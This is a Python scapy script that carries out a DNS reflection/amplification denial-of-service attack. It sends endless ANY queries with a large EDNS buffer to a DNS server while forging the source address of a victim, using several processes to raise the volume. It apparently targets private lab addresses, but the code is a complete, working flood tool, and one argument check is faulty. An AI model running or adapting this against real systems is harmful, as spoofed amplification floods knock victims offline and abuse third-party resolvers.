from scapy.config import conf
from scapy.layers.dns import DNS, DNSQR, DNSRROPT
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import send
from scapy.volatile import RandShort
from multiprocessing import Process
import sys
import signal

WEB_VICTIM_IP = "172.16.238.10"
DNS_VICTIM_IP = "172.16.238.11"

try:
    spoof_ip = WEB_VICTIM_IP if int(sys.argv[1]) == "web" else DNS_VICTIM_IP
    number_processes = int(sys.argv[2])
    dns_ip = sys.argv[3]
except:
    spoof_ip = WEB_VICTIM_IP
    number_processes = 2
    dns_ip = 8

destination_ip = "172.16.238.{}".format(dns_ip)

conf.verb = 0


def attack():
    request = (
            IP(src=spoof_ip, dst=destination_ip) /
            UDP(dport=53, sport=RandShort()) /
            DNS(id=RandShort(), rd=1, qdcount=1, cd=1, qd=DNSQR(qname="example.com", qtype=255, qclass=1),
                ar=DNSRROPT(rclass=65527, rdlen=0)
                )
    )
    print("sending packets of length:", len(request), " to ", destination_ip, " pretending to be ", spoof_ip)
    send(request, loop=1, count=None)


if __name__ == '__main__':
    processes = []

    def signal_handler(signal, frame):
        print("shutting down attack")
        for p in processes:
            p.terminate()
        sys.exit(0)


    signal.signal(signal.SIGINT, signal_handler)

    for m in range(1, number_processes):
            p = Process(target=attack)
            p.start()
            processes.append(p)
    attack()
